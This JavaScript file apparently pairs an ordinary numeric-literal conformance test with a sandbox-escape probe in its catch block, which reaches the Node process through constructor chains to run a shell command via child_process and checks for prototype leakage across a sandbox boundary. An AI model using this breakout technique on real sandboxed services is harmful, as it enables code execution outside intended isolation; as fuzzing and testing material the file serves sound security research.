try {
    if (0 !== 0) {
        $ERROR('#0: 0.0E-1 === 0');
    }
    if (0.11 !== 0.11) {
        $ERROR('#1: 1.1E-1 === 0.11');
    }
    if (0.22 !== 0.22) {
        $ERROR('#2: 2.2E-1 === 0.22');
    }
    if (0.33 !== 0.33) {
        $ERROR('#3: 3.3E-1 === 0.33');
    }
    if (0.44 !== 0.44) {
        $ERROR('#4: 4.4E-1 === 0.44');
    }
    if (0.55 !== 0.55) {
        $ERROR('#5: 5.5E-1 === 0.55');
    }
    if (0.66 !== 0.66) {
        $ERROR('#6: 6.E-1 === 0.66');
    }
    if (0.77 !== 0.77) {
        $ERROR('#7: 7.7E-1 === 0.77');
    }
    if (0.88 !== 0.88) {
        $ERROR('#8: 8.8E-1 === 0.88');
    }
    if (0.99 !== 0.99) {
        $ERROR('#9: 9.9E-1 === 0.99');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}